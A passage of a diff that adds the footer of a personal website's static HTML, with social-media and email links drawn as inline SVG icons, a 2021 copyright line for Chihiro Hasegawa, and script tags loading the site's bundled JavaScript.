+><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg>
+</a>
+      </li><li>
+        <a href='https://facebook.com/MunifTanjim' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Facebook account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />
+</svg>
+</a>
+      </li><li>
+        <a href='https://twitter.com/encry1024' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Twitter account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />
+</svg>
+</a>
+      </li><li>
+        <a href='https://instagram.com/encry1024' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Instagram account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
+<path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
+<line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:encry1024@gmail.com' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Contact via Email</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+<polyline points="22,6 12,13 2,6" />
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p> &copy; 2021 Chihiro Hasegawa </p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script><script src='/js/custom.js'></script>
+
+</body>
+
+</html>
+
